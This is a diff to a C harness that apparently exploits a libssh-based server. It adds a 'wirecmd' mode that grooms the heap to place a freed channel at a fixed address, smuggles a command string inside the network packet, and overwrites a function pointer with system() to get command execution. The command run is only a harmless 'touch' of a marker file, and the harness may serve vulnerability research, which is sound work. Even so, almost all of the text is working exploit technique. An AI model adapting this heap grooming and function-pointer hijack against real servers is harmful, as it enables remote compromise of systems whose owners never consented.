@@ -53,6 +53,16 @@ static int g_inline = 0;
 static int g_realsystem = 0;
 static const char g_realsystem_cmd[] =
     "touch evidence-wire-vuln-groom-realsystem.marker";
+#ifdef W16_WIRECMD
+/* W16: put system()'s command string in the wire packet itself. The ASan
+ * allocator places the recycled 128-byte channel at a deterministic address,
+ * so the client can point channel->session at bytes it sent, with no
+ * app-owned static command string. Still ASLR-local for &system. */
+static int g_wirecmd = 0;
+static const char g_wirecmd_cmd[] = "touch evidence-wire-wirecmd.marker";
+#define WIRECMD_CHUNK 0x50c00001c480ULL
+#define WIRECMD_CMD_OFF 8
+#endif
 #endif
 #ifdef W12_FIXEDADDR
 static int g_fixedaddr = 0;
@@ -225,6 +235,14 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
             printf("SERVER REALSYS armed fn=0x%llx sess=0x%llx cmd=%s\n",
                    (unsigned long long)armed_fn, (unsigned long long)sess,
                    g_realsystem_cmd);
+#ifdef W16_WIRECMD
+        if (g_wirecmd) {
+            printf("SERVER WIRECMD armed fn=0x%llx sess=0x%llx cmd=%s\n",
+                   (unsigned long long)armed_fn, (unsigned long long)sess,
+                   (const char *)(uintptr_t)sess);
+            fflush(stdout);
+        }
+#endif
             fflush(stdout);
         }
 #endif
@@ -428,6 +446,20 @@ static int run_client(void)
                        g_realsystem_cmd, g_bad_call);
                 fflush(stdout);
             }
+#ifdef W16_WIRECMD
+            if (g_wirecmd) {
+                uint64_t sess = WIRECMD_CHUNK + WIRECMD_CMD_OFF;
+                fn = g_bad_call ? 0x4141414141414141ull :
+                     (uint64_t)(uintptr_t)&system;
+                memcpy(payload + WIRECMD_CMD_OFF, g_wirecmd_cmd,
+                       strlen(g_wirecmd_cmd) + 1);
+                memcpy(payload, &sess, sizeof(sess));
+                printf("CLIENT wirecmd fn=0x%llx sess=0x%llx cmd=%s bad=%d\n",
+                       (unsigned long long)fn, (unsigned long long)sess,
+                       g_wirecmd_cmd, g_bad_call);
+                fflush(stdout);
+            }
+#endif
 #endif
             memcpy(payload + 112, &fn, sizeof(fn));
             if (g_exec) {
@@ -582,6 +614,21 @@ int main(int argc, char **argv)
         g_call = 1;
         g_realsystem = 1;
         g_bad_call = 1;
+#ifdef W16_WIRECMD
+    } else if (argc == 3 && strcmp(argv[2], "groom-wirecmd") == 0) {
+        g_groom = 1;
+        g_survive = 1;
+        g_call = 1;
+        g_realsystem = 1;
+        g_wirecmd = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-wirecmd-bad") == 0) {
+        g_groom = 1;
+        g_survive = 1;
+        g_call = 1;
+        g_realsystem = 1;
+        g_wirecmd = 1;
+        g_bad_call = 1;
+#endif
 #endif
 #ifdef W13_INLINE
     } else if (argc == 3 && strcmp(argv[2], "groom-inline") == 0) {
